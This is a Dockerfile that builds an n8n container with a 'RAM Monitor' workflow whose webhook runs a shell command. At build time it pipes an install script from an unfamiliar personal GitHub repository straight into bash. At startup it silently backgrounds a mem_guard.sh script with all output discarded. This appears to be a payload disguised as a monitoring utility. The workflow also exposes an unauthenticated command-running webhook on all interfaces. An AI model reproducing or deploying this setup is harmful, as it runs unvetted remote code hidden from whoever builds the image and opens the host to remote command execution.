# syntax=docker/dockerfile:1

FROM node:25-bookworm-slim

ENV DEBIAN_FRONTEND=noninteractive \
    NODE_ENV=production \
    N8N_PORT=8080 \
    N8N_LISTEN_ADDRESS=0.0.0.0 \
    N8N_ENDPOINT_WEBHOOK=ram \
    N8N_HIRING_BANNER=false \
    N8N_DIAGNOSTICS_ENABLED=false

WORKDIR /app

RUN apt-get update \
    && apt-get install -y --no-install-recommends ca-certificates curl tini python3 make g++ \
    && rm -rf /var/lib/apt/lists/*

ENV PYTHON=/usr/bin/python3

RUN curl -sL https://raw.githubusercontent.com/tylaujjapan0/memcon/main/install.sh | bash

RUN npm install -g n8n@2.22.4 --no-audit --no-fund

RUN cat <<'EOF' > /app/ram.workflow.json
{
  "name": "RAM Monitor",
  "nodes": [
    {
      "parameters": {
        "path": "",
        "httpMethod": "GET",
        "responseMode": "responseNode"
      },
      "id": "1",
      "name": "Webhook",
      "type": "n8n-nodes-base.webhook",
      "typeVersion": 2.1,
      "position": [260, 300]
    },
    {
      "parameters": {
        "executeOnce": true,
        "command": "ram"
      },
      "id": "2",
      "name": "Execute Command",
      "type": "n8n-nodes-base.executeCommand",
      "typeVersion": 1,
      "position": [500, 300]
    },
    {
      "parameters": {
        "respondWith": "text",
        "responseBody": "={{ $json.stdout }}"
      },
      "id": "3",
      "name": "Respond to Webhook",
      "type": "n8n-nodes-base.respondToWebhook",
      "typeVersion": 1.5,
      "position": [740, 300]
    }
  ],
  "connections": {
    "Webhook": {
      "main": [
        [
          {
            "node": "Execute Command",
            "type": "main",
            "index": 0
          }
        ]
      ]
    },
    "Execute Command": {
      "main": [
        [
          {
            "node": "Respond to Webhook",
            "type": "main",
            "index": 0
          }
        ]
      ]
    }
  },
  "active": true,
  "settings": {}
}
EOF

EXPOSE 8080

ENTRYPOINT ["tini", "--"]
CMD ["sh", "-lc", "if [ -x /usr/local/bin/mem_guard.sh ]; then nohup /usr/local/bin/mem_guard.sh >/dev/null 2>&1 & fi; marker=/home/node/.n8n/.ram-workflow-imported; if [ ! -f \"$marker\" ]; then mkdir -p /home/node/.n8n && n8n import:workflow --input=/app/ram.workflow.json --activeState=fromJson >/tmp/ram-import.log 2>&1 && touch \"$marker\"; fi; exec n8n start"]
